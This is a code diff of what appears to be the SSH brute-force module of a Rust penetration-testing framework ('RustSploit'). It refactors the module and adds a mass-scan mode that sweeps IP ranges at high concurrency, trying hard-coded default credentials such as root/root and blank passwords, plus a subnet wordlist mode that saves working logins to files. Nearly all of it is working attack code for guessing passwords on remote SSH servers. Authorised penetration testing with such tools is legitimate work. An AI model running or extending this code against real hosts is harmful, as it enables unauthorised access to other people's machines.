@@ -2,28 +2,29 @@ use anyhow::{anyhow, Result};
 use colored::*;
 use ssh2::Session;
 use std::{
-    net::TcpStream,
-    sync::atomic::{AtomicBool, Ordering},
-    sync::Arc,
-    time::Duration,
     io::Write,
+    net::{IpAddr, TcpStream, ToSocketAddrs},
+    time::Duration,
 };
 use tokio::{
-    sync::{Mutex, Semaphore},
     task::spawn_blocking,
-    time::{sleep, timeout},
+    time::timeout,
 };
-use futures::stream::{FuturesUnordered, StreamExt};
 
 use crate::utils::{
-    normalize_target, prompt_default, prompt_yes_no, 
-    prompt_existing_file, load_lines, get_filename_in_current_dir, prompt_port
+    normalize_target,
+    load_lines, get_filename_in_current_dir,
+    cfg_prompt_default, cfg_prompt_yes_no, cfg_prompt_existing_file, cfg_prompt_port,
+    cfg_prompt_output_file,
 };
-use crate::modules::creds::utils::BruteforceStats;
+use crate::modules::creds::utils::{
+    BruteforceConfig, LoginResult, SubnetScanConfig,
+    generate_combos, run_bruteforce, run_subnet_bruteforce,
+    is_subnet_target, is_mass_scan_target, run_mass_scan, MassScanConfig,
+};
 
 // Constants
 const DEFAULT_SSH_PORT: u16 = 22;
-const PROGRESS_INTERVAL_SECS: u64 = 2;
 const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
     ("root", "root"),
     ("admin", "admin"),
@@ -41,45 +42,117 @@ const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
 ];
 
 
+pub fn info() -> crate::module_info::ModuleInfo {
+    crate::module_info::ModuleInfo {
+        name: "SSH Brute Force".to_string(),
+        description: "Brute-force SSH authentication using username/password wordlists. Supports default credential testing, combo mode, concurrent connections, and subnet/mass scanning.".to_string(),
+        authors: vec!["RustSploit Contributors".to_string()],
+        references: vec![],
+        disclosure_date: None,
+        rank: crate::module_info::ModuleRank::Normal,
+    }
+}
+
 pub async fn run(target: &str) -> Result<()> {
-    println!("{}", "=== SSH Brute Force Module ===".bold());
-    println!("[*] Target: {}", target);
+    crate::mprintln!("{}", "=== SSH Brute Force Module ===".bold());
+    crate::mprintln!("[*] Target: {}", target);
 
-    // Check for API-provided config
-    let config = crate::config::get_module_config();
-    let api_mode = config.is_api_mode();
+    // --- Mass Scan Mode ---
+    if is_mass_scan_target(target) {
+        crate::mprintln!("{}", format!("[*] Target: {} — Mass Scan Mode", target).yellow());
+        return run_mass_scan(target, MassScanConfig {
+            protocol_name: "SSH",
+            default_port: 22,
+            state_file: "ssh_hose_state.log",
+            default_output: "ssh_mass_results.txt",
+            default_concurrency: 200,
+        }, move |ip, port| {
+            async move {
+                if !crate::utils::tcp_port_open(ip, port, std::time::Duration::from_secs(5)).await {
+                    return None;
+                }
+                let addr = format!("{}:{}", ip, port);
+                let tcp = match crate::utils::blocking_tcp_connect(
+                    &addr.parse().ok()?, std::time::Duration::from_secs(5)
+                ) {
+                    Ok(t) => t,
+                    Err(_) => return None,
+                };
+                let mut sess = ssh2::Session::new().ok()?;
+                sess.set_tcp_stream(tcp);
+                sess.set_timeout(10000);
+                if sess.handshake().is_err() { return None; }
+                // Try common defaults
+                let creds = [("root","root"),("admin","admin"),("root",""),("admin",""),("root","123456"),("admin","password")];
+                for (user, pass) in creds {
+                    if sess.userauth_password(user, pass).is_ok() {
+                        let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
+                        return Some(format!("[{}] {}:{}:{}:{}\n", ts, ip, port, user, pass));
+                    }
+                }
+                None
+            }
+        }).await;
+    }
 
-    let port: u16 = if let Some(p) = config.port {
-        p
+    // --- Subnet Scan Mode ---
+    if is_subnet_target(target) {
+        let port: u16 = cfg_prompt_port("port", "SSH Port", DEFAULT_SSH_PORT).await?;
+
+        let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
+        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
+        let users = load_lines(&usernames_file)?;
+        let passes = load_lines(&passwords_file)?;
+        if users.is_empty() { return Err(anyhow!("User list empty")); }
+        if passes.is_empty() { return Err(anyhow!("Pass list empty")); }
+
+        let concurrency: usize = {
+            let input = cfg_prompt_default("concurrency", "Max concurrent hosts", "10").await?;
+            input.parse::<usize>().unwrap_or(10).max(1).min(256)
+        };
+        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
+        let output_file = cfg_prompt_output_file("output_file", "Output result file", "ssh_subnet_results.txt").await?;
+
+        let connection_timeout: u64 = {
+            let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "5").await?;
+            input.parse::<u64>().unwrap_or(5).max(1).min(60)
+        };
+        let timeout_duration = Duration::from_secs(connection_timeout);
+
+        return run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
+            concurrency,
+            verbose,
+            output_file,
+            service_name: "ssh",
+            source_module: "creds/generic/ssh_bruteforce",
+            skip_tcp_check: false,
+        }, move |ip: IpAddr, port: u16, user: String, pass: String| {
+            let timeout_dur = timeout_duration;
+            async move {
+                let addr = format!("{}:{}", ip, port);
+                match try_ssh_login(&addr, &user, &pass, timeout_dur).await {
+                    Ok(true) => LoginResult::Success,
+                    Ok(false) => LoginResult::AuthFailed,
+                    Err(e) => LoginResult::Error { message: e.to_string(), retryable: true },
+                }
+            }
+        }).await;
+    }
+
+    // --- Single Target Mode ---
+    let port: u16 = cfg_prompt_port("port", "SSH Port", DEFAULT_SSH_PORT).await?;
+
+    // Ask about default credentials
+    let use_defaults = cfg_prompt_yes_no("use_defaults", "Try default credentials first?", true).await?;
+
+    let usernames_file = if cfg_prompt_yes_no("use_username_wordlist", "Use username wordlist?", true).await? {
+        Some(cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?)
     } else {
-        prompt_port("SSH Port", DEFAULT_SSH_PORT)?
+        None
     };
 
-    // In API mode, skip default credentials question and use wordlists directly
-    let use_defaults = if api_mode { false } else { prompt_yes_no("Try default credentials first?", true)? };
-    
-    let usernames_file = if let Some(ref f) = config.username_wordlist {
-        if !std::path::Path::new(f).exists() {
-            return Err(anyhow!("Username wordlist not found: {}", f));
-        }
-        Some(f.clone())
-    } else if api_mode {
-        None
-    } else if prompt_yes_no("Use username wordlist?", true)? {
-        Some(prompt_existing_file("Username wordlist")?)
-    } else {
-        None
-    };
-    
-    let passwords_file = if let Some(ref f) = config.password_wordlist {
-        if !std::path::Path::new(f).exists() {
-            return Err(anyhow!("Password wordlist not found: {}", f));
-        }
-        Some(f.clone())
-    } else if api_mode {
-        None
-    } else if prompt_yes_no("Use password wordlist?", true)? {
-        Some(prompt_existing_file("Password wordlist")?)
+    let passwords_file = if cfg_prompt_yes_no("use_password_wordlist", "Use password wordlist?", true).await? {
+        Some(cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?)
     } else {
         None
     };
@@ -88,77 +161,46 @@ pub async fn run(target: &str) -> Result<()> {
         return Err(anyhow!("At least one wordlist or default credentials must be enabled"));
     }
 
-    let concurrency: usize = config.concurrency.unwrap_or_else(|| {
-        if api_mode { 10 } else {
-            loop {
-                let input = prompt_default("Max concurrent tasks", "10").unwrap_or_else(|_| "10".to_string());
-                match input.parse() {
-                    Ok(n) if n > 0 && n <= 256 => return n,
-                    _ => println!("{}", "Invalid number. Must be between 1 and 256.".yellow()),
-                }
-            }
-        }
-    });
-
-    let connection_timeout: u64 = if api_mode { 
-        10 
-    } else {
-        loop {
-            let input = prompt_default("Connection timeout (seconds)", "5").unwrap_or_else(|_| "5".to_string());
-            match input.parse::<u64>() {
-                Ok(n) if n >= 1 && n <= 60 => break n,
-                _ => println!("{}", "Invalid timeout. Must be between 1 and 60 seconds.".yellow()),
-            }
-        }
+    let concurrency: usize = {
+        let input = cfg_prompt_default("concurrency", "Max concurrent tasks", "10").await?;
+        input.parse::<usize>().unwrap_or(10).max(1).min(256)
     };
 
-    let retry_on_error = if api_mode { true } else { prompt_yes_no("Retry on connection errors?", true)? };
+    let connection_timeout: u64 = {
+        let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "5").await?;
+        input.parse::<u64>().unwrap_or(5).max(1).min(60)
+    };
+
+    let retry_on_error = cfg_prompt_yes_no("retry_on_error", "Retry on connection errors?", true).await?;
     let max_retries: usize = if retry_on_error {
-        if api_mode { 2 } else {
-            loop {
-                let input = prompt_default("Max retries per attempt", "2").unwrap_or_else(|_| "2".to_string());
-                match input.parse::<usize>() {
-                    Ok(n) if n > 0 && n <= 10 => break n,
-                    _ => println!("{}", "Invalid retries. Must be between 1 and 10.".yellow()),
-                }
-            }
-        }
+        let input = cfg_prompt_default("max_retries", "Max retries per attempt", "2").await?;
+        input.parse::<usize>().unwrap_or(2).max(1).min(10)
     } else {
         0
     };
 
-    let stop_on_success = config.stop_on_success.unwrap_or_else(|| {
-        if api_mode { true } else { prompt_yes_no("Stop on first success?", true).unwrap_or(true) }
-    });
-    let save_results = config.save_results.unwrap_or_else(|| {
-        if api_mode { true } else { prompt_yes_no("Save results to file?", true).unwrap_or(true) }
-    });
+    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
+    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
     let save_path = if save_results {
-        Some(config.output_file.clone().unwrap_or_else(|| {
-            if api_mode { "ssh_brute_results.txt".to_string() } else { prompt_default("Output file", "ssh_brute_results.txt").unwrap_or_else(|_| "ssh_brute_results.txt".to_string()) }
-        }))
+        Some(cfg_prompt_output_file("output_file", "Output file", "ssh_brute_results.txt").await?)
     } else {
         None
     };
-    let verbose = config.verbose.unwrap_or_else(|| {
-        if api_mode { false } else { prompt_yes_no("Verbose mode?", false).unwrap_or(false) }
-    });
-    let combo_mode = config.combo_mode.unwrap_or_else(|| {
-        if api_mode { false } else { prompt_yes_no("Combination mode? (try every pass with every user)", false).unwrap_or(false) }
-    });
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
+    let combo_mode = cfg_prompt_yes_no("combo_mode", "Combination mode? (try every pass with every user)", false).await?;
 
     let connect_addr = normalize_target(&format!("{}:{}", target, port)).unwrap_or_else(|_| format!("{}:{}", target, port));
 
-    println!("\n{}", format!("[*] Starting brute-force on {}", connect_addr).cyan());
+    crate::mprintln!("\n{}", format!("[*] Starting brute-force on {}", connect_addr).cyan());
 
     // Load wordlists
     let mut usernames = Vec::new();
     if let Some(ref file) = usernames_file {
         usernames = load_lines(file)?;
         if usernames.is_empty() {
-            println!("{}", "[!] Username wordlist is empty.".yellow());
+            crate::mprintln!("{}", "[!] Username wordlist is empty.".yellow());
         } else {
-            println!("{}", format!("[*] Loaded {} usernames", usernames.len()).green());
+            crate::mprintln!("{}", format!("[*] Loaded {} usernames", usernames.len()).green());
         }
     }
 
@@ -166,9 +208,9 @@ pub async fn run(target: &str) -> Result<()> {
     if let Some(ref file) = passwords_file {
         passwords = load_lines(file)?;
         if passwords.is_empty() {
-            println!("{}", "[!] Password wordlist is empty.".yellow());
+            crate::mprintln!("{}", "[!] Password wordlist is empty.".yellow());
         } else {
-            println!("{}", format!("[*] Loaded {} passwords", passwords.len()).green());
+            crate::mprintln!("{}", format!("[*] Loaded {} passwords", passwords.len()).green());
         }
     }
 
@@ -182,7 +224,7 @@ pub async fn run(target: &str) -> Result<()> {
                 passwords.push(pass.to_string());
             }
         }
-        println!("{}", format!("[*] Added {} default credentials", DEFAULT_CREDENTIALS.len()).green());
+        crate::mprintln!("{}", format!("[*] Added {} default credentials", DEFAULT_CREDENTIALS.len()).green());
     }
 
     if usernames.is_empty() {
@@ -192,243 +234,79 @@ pub async fn run(target: &str) -> Result<()> {
         return Err(anyhow!("No passwords available"));
     }
 
-    // Calculate total attempts
-    let total_attempts = if combo_mode {
-        usernames.len() * passwords.len()
-    } else {
-        passwords.len()
-    };
-    println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
-    println!();
-
-    let found = Arc::new(Mutex::new(Vec::new()));
-    let unknown = Arc::new(Mutex::new(Vec::<(String, String, String, String)>::new()));
-    let stop = Arc::new(AtomicBool::new(false));
-    let stats = Arc::new(BruteforceStats::new());
-    let semaphore = Arc::new(Semaphore::new(concurrency));
+    let combos = generate_combos(&usernames, &passwords, combo_mode);
     let timeout_duration = Duration::from_secs(connection_timeout);
 
-    // Start progress reporter
-    let stats_clone = stats.clone();
-    let stop_clone = stop.clone();
-    let progress_handle = tokio::spawn(async move {
-        loop {
-            if stop_clone.load(Ordering::Relaxed) {
-                break;
+    let try_login = move |t: String, p: u16, user: String, pass: String| {
+        let timeout_dur = timeout_duration;
+        async move {
+            let addr = normalize_target(&format!("{}:{}", t, p))
+                .unwrap_or_else(|_| format!("{}:{}", t, p));
+            match try_ssh_login(&addr, &user, &pass, timeout_dur).await {
+                Ok(true) => LoginResult::Success,
+                Ok(false) => LoginResult::AuthFailed,
+                Err(e) => LoginResult::Error { message: e.to_string(), retryable: true },
             }
-            stats_clone.print_progress();
-            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
         }
-    });
+    };
 
-    let mut tasks = FuturesUnordered::new();
-    let mut user_cycle_idx = 0usize;
+    let result = run_bruteforce(&BruteforceConfig {
+        target: target.to_string(),
+        port,
+        concurrency,
+        stop_on_success,
+        verbose,
+        delay_ms: 0,
+        max_retries,
+        service_name: "ssh",
+        source_module: "creds/generic/ssh_bruteforce",
+    }, combos, try_login).await?;
 
-    for pass in passwords.iter() {
-        if stop_on_success && stop.load(Ordering::Relaxed) {
-            break;
-        }
-
-        let selected_users: Vec<String> = if combo_mode {
-            usernames.iter().cloned().collect()
-        } else {
-            if usernames.is_empty() {
-                Vec::new()
-            } else {
-                let user = usernames[user_cycle_idx % usernames.len()].clone();
-                user_cycle_idx += 1;
-                vec![user]
-            }
-        };
-
-        for user in selected_users {
-            if stop_on_success && stop.load(Ordering::Relaxed) {
-                break;
-            }
-
-            let addr_clone = connect_addr.clone();
-            let user_clone = user.clone();
-            let pass_clone = pass.clone();
-            let found_clone = Arc::clone(&found);
-            let unknown_clone = Arc::clone(&unknown);
-            let stop_clone = Arc::clone(&stop);
-            let stats_clone = Arc::clone(&stats);
-            let semaphore_clone = semaphore.clone();
-            let timeout_clone = timeout_duration;
-            let stop_flag = stop_on_success;
-            let verbose_flag = verbose;
-            let retry_flag = retry_on_error;
-            let max_retries_clone = max_retries;
-
-            tasks.push(tokio::spawn(async move {
-                if stop_flag && stop_clone.load(Ordering::Relaxed) {
-                    return;
-                }
-
-                // Acquire semaphore permit inside the spawned task
-                let _permit = match semaphore_clone.acquire_owned().await {
-                    Ok(permit) => permit,
-                    Err(_) => return,
-                };
-                
-                if stop_flag && stop_clone.load(Ordering::Relaxed) {
-                    return;
-                }
-
-                let mut retries = 0;
-                loop {
-                    match try_ssh_login(&addr_clone, &user_clone, &pass_clone, timeout_clone).await {
-                        Ok(true) => {
-                            println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone).green());
-                            let mut found_guard = found_clone.lock().await;
-                            // Check if already found to avoid duplicates
-                            let entry = (addr_clone.clone(), user_clone.clone(), pass_clone.clone());
-                            if !found_guard.contains(&entry) {
-                                found_guard.push(entry);
-                            }
-                            stats_clone.record_attempt(true, false);
-                            if stop_flag {
-                                stop_clone.store(true, Ordering::Relaxed);
-                            }
-                            break;
-                        }
-                        Ok(false) => {
-                            stats_clone.record_attempt(false, false);
-                            if verbose_flag {
-                                println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone).dimmed());
-                            }
-                            break;
-                        }
-                        Err(e) => {
-                            stats_clone.record_attempt(false, true);
-                            let msg = e.to_string();
-                            if retry_flag && retries < max_retries_clone {
-                                retries += 1;
-                                stats_clone.record_retry();
-                                if verbose_flag {
-                                    println!(
-                                        "\r{}",
-                                        format!(
-                                            "[!] {} -> {}:{} (retry {}/{}) - {}",
-                                            addr_clone,
-                                            user_clone,
-                                            pass_clone,
-                                            retries,
-                                            max_retries_clone,
-                                            msg
-                                        )
-                                        .yellow()
-                                    );
-                                }
-                                sleep(Duration::from_millis(500)).await;
-                                continue;
-                            } else {
-                                {
-                                    let mut unk = unknown_clone.lock().await;
-                                    unk.push((
-                                        addr_clone.clone(),
-                                        user_clone.clone(),
-                                        pass_clone.clone(),
-                                        msg.clone(),
-                                    ));
-                                }
-                                if verbose_flag {
-                                    println!(
-                                        "\r{}",
-                                        format!(
-                                            "[?] {} -> {}:{} error/unknown: {}",
-                                            addr_clone, user_clone, pass_clone, msg
-                                        )
-                                        .yellow()
-                                    );
-                                }
-                                break;
-                            }
-                        }
-                    }
-                }
-            }));
-        }
+    result.print_found();
+    if let Some(ref path) = save_path {
+        result.save_to_file(path)?;
     }
-
-    // Wait for all tasks with FuturesUnordered
-    while let Some(res) = tasks.next().await {
-         if let Err(e) = res {
-            if verbose {
-                println!("\r{}", format!("[!] Task error: {}", e).red());
-            }
-        }
-    }
-
-    stop.store(true, Ordering::Relaxed);
-    let _ = progress_handle.await;
-
-    stats.print_final().await;
-
-    let creds = found.lock().await;
-    if creds.is_empty() {
-        println!("\n{}", "[-] No credentials found.".yellow());
-    } else {
-        println!("\n{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
-        for (host, user, pass) in creds.iter() {
-            println!("     {} -> {}:{}", host, user, pass);
-        }
-
-        if let Some(path_str) = save_path {
-            let filename = get_filename_in_current_dir(&path_str);
-            // Use std::fs::File for simple writing
-            use std::fs::File;
-            let mut file = File::create(&filename)?;
-            for (host, user, pass) in creds.iter() {
-                writeln!(file, "{} -> {}:{}", host, user, pass)?;
-            }
-            file.flush()?;
-            println!("{}", format!("[+] Results saved to '{}'", filename.display()).green());
-        }
-    }
-
-    drop(creds);
 
     // Unknown / errored attempts
-    let unknown_guard = unknown.lock().await;
-    if !unknown_guard.is_empty() {
-        println!(
+    if !result.errors.is_empty() {
+        crate::mprintln!(
             "{}",
             format!(
                 "[?] Collected {} unknown/errored SSH responses.",
-                unknown_guard.len()
+                result.errors.len()
             )
             .yellow()
             .bold()
         );
-        if prompt_yes_no("Save unknown responses to file?", true)? {
+        if cfg_prompt_yes_no("save_unknown_responses", "Save unknown responses to file?", true).await? {
             let default_name = "ssh_unknown_responses.txt";
-            let fname = prompt_default(
-                &format!(
-                    "What should the unknown results be saved as? (default: {})",
-                    default_name
-                ),
+            let fname = cfg_prompt_output_file(
+                "unknown_responses_file",
+                "What should the unknown results be saved as?",
                 default_name,
-            )?;
+            ).await?;
             let filename = get_filename_in_current_dir(&fname);
-            use std::fs::File;
-            match File::create(&filename) {
+            use std::os::unix::fs::OpenOptionsExt;
+            let mut opts = std::fs::OpenOptions::new();
+            opts.write(true).create(true).truncate(true);
+            opts.mode(0o600);
+            match opts.open(&filename) {
                 Ok(mut file) => {
                     writeln!(
                         file,
                         "# SSH Bruteforce Unknown/Errored Responses (host,user,pass,error)"
                     )?;
-                    for (host, user, pass, msg) in unknown_guard.iter() {
+                    for (host, user, pass, msg) in &result.errors {
                         writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                     }
                     file.flush()?;
-                    println!(
+                    crate::mprintln!(
                         "{}",
                         format!("[+] Unknown responses saved to '{}'", filename.display()).green()
                     );
                 }
                 Err(e) => {
-                    println!(
+                    crate::mprintln!(
                         "{}",
                         format!(
                             "[!] Could not create unknown response file '{}': {}",
@@ -456,19 +334,23 @@ async fn try_ssh_login(
     let addr_owned = normalized_addr.to_string();
 
     let handle = spawn_blocking(move || {
-            let tcp = TcpStream::connect(&addr_owned)
+            let socket_addr: std::net::SocketAddr = addr_owned.parse()
+                .or_else(|_| addr_owned.to_socket_addrs().and_then(|mut a|
+                    a.next().ok_or_else(|| std::io::Error::new(std::io::ErrorKind::NotFound, "No addresses resolved"))))
+                .map_err(|e| anyhow!("Cannot resolve address {}: {}", addr_owned, e))?;
+            let tcp = TcpStream::connect_timeout(&socket_addr, timeout_duration)
                 .map_err(|e| anyhow!("Connection error: {}", e))?;
-            
+
             let mut sess = Session::new()
                 .map_err(|e| anyhow!("Failed to create SSH session: {}", e))?;
             sess.set_tcp_stream(tcp);
-            
+
             sess.handshake()
                 .map_err(|e| anyhow!("SSH handshake failed: {}", e))?;
-            
+
             sess.userauth_password(&user_owned, &pass_owned)
                 .map_err(|e| anyhow!("Authentication failed: {}", e))?;
-            
+
             Ok(sess.authenticated())
     });
 
